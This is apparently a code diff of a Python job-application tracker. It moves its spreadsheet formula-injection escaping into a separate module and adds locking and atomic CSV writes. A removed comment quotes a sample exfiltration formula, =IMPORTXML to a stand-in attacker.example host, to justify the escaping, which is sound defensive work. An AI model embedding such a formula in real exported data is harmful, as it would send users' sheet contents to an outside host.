@@ -18,33 +18,21 @@ from typing import IO
 
 from pydantic import ValidationError
 
+from .domain.application_cells import APPLIED_COLUMNS as APPLIED_COLUMNS
+from .domain.application_cells import ESCAPE as ESCAPE
+from .domain.application_cells import FORMULA_START as FORMULA_START
+from .domain.application_cells import neutralise as neutralise
+from .domain.application_cells import restore as restore
 from .domain.dedupe import fingerprint, key
 from .domain.job import Job
 from .domain.ports import PROVISIONAL, STATUSES  # noqa: F401 - STATUSES re-exported
 from .domain.salary import parse_salary
-from .files import read_document, write_document
+from .files import read_document, write_document, write_document_bytes
+from .infra.store.application_csv import ApplicationCSV
+from .infra.store.financials_lock import export_lock
+from .infra.store.publication import durable_replace
 
 logger = logging.getLogger(__name__)
-
-APPLIED_COLUMNS = [
-    'applied_at',
-    'status',
-    'source',
-    'id',
-    'title',
-    'company',
-    'location',
-    'salary',
-    'salary_annual_low',
-    'salary_annual_high',
-    'currency',
-    'experience_min',
-    'experience_max',
-    'posted',
-    'url',
-    'flags',
-    'note',
-]
 
 
 def is_final(row: dict) -> bool:
@@ -85,39 +73,6 @@ class Settled:
         return bool(mark and self.boards.get(mark, set()) - {job.source})
 
 
-# A spreadsheet runs any cell starting with one of these as a formula, and the
-# log is full of text scraped from job boards: a posting titled
-# =IMPORTXML("https://attacker.example/?"&A1, ...) would run on import and could
-# send the sheet's contents away. From OWASP's CSV Injection page, including the
-# full-width forms some locales also treat as formula starts.
-FORMULA_START = ('=', '+', '-', '@', '\t', '\r', '\n', '＝', '＋', '－', '＠')
-ESCAPE = "'"
-
-
-def _escaped(value: str) -> bool:
-    """Whether neutralise() quotes this: a formula start - or a quote before
-    one, so restore() never strips a quote that was really there."""
-    return value.startswith(FORMULA_START) or (
-        value.startswith(ESCAPE) and value[1:].startswith(FORMULA_START)
-    )
-
-
-def neutralise(value):
-    """'=1+2' -> "'=1+2": read as text, not run as a formula. Other values pass
-    through - including numbers, so a negative figure stays a number. "'=1"
-    becomes "''=1", which reads back - and shows in a spreadsheet - as "'=1"."""
-    if isinstance(value, str) and _escaped(value):
-        return ESCAPE + value
-    return value
-
-
-def restore(value):
-    """Undo neutralise(), so the log reads back as the data that went in."""
-    if isinstance(value, str) and value.startswith(ESCAPE) and _escaped(value[1:]):
-        return value[1:]
-    return value
-
-
 def _stored(document: dict) -> list[dict]:
     items = document.get('list', [])
     return [item for item in items if isinstance(item, dict)] if isinstance(items, list) else []
@@ -138,6 +93,11 @@ def save_jobs(jobs: Iterable[Job], filepath: str) -> int:
     An unreadable listing is moved aside rather than overwritten, and the write
     is atomic, so a crash part way never costs the jobs already stored.
     """
+    with export_lock(filepath):
+        return _save_jobs(jobs, filepath)
+
+
+def _save_jobs(jobs, filepath):
     merged = {}
     for item in _stored(read_document(filepath, quarantine=True)):
         merged[key(item)] = item
@@ -145,6 +105,9 @@ def save_jobs(jobs: Iterable[Job], filepath: str) -> int:
     before = len(merged)
     for job in jobs:
         item = job.to_dict()
+        previous = merged.get(key(item), {})
+        if 'enrichment_v1' in previous:
+            item['enrichment_v1'] = previous['enrichment_v1']
         merged[key(item)] = item
 
     write_document(filepath, {'list': list(merged.values())})
@@ -226,6 +189,8 @@ def jobs_from(items: Iterable[dict], origin: str) -> list[Job]:
     jobs = []
     skipped = 0
     for item in items:
+        if 'pending_job_v1' in item:
+            continue
         try:
             jobs.append(Job.from_dict(item))
         except ValidationError as error:
@@ -253,7 +218,12 @@ class ApplicationLog:
 
     def record(self, entries: Iterable[tuple[Job, str, str]]) -> int:
         """entries: iterable of (job, status, note). Returns rows written."""
-        rows = [row for row in self.rows() if is_final(row)]
+        with export_lock(self.path, wait=True):
+            return self._record(entries)
+
+    def _record(self, entries):
+        layout = ApplicationCSV.read(self.path)
+        rows = [row for row in layout.rows() if is_final(row)]
         seen = {(row.get('source'), row.get('id')) for row in rows}
         boards_of: dict[str, set[str | None]] = {}
         for row in rows:
@@ -270,14 +240,9 @@ class ApplicationLog:
             logger.debug(f'{self.path}: nothing new to record')
             return 0
 
-        is_new = not os.path.exists(self.path) or os.path.getsize(self.path) == 0
-        os.makedirs(os.path.dirname(os.path.abspath(self.path)), exist_ok=True)
-        # created owner-only, like every file applicant writes; an existing
-        # file keeps the mode it has
-        descriptor = os.open(self.path, os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)
-        # utf-8-sig so Sheets and Excel both read the currency symbols correctly
-        with os.fdopen(descriptor, 'a', encoding='utf-8-sig', newline='') as handle:
-            write_rows(handle, fresh, header=is_new)
+        for row in fresh:
+            layout.set(None, row)
+        write_document_bytes(self.path, layout.render(), replace=durable_replace)
         logger.info(f'{self.path}: recorded {len(fresh)} application(s)')
         return len(fresh)
 
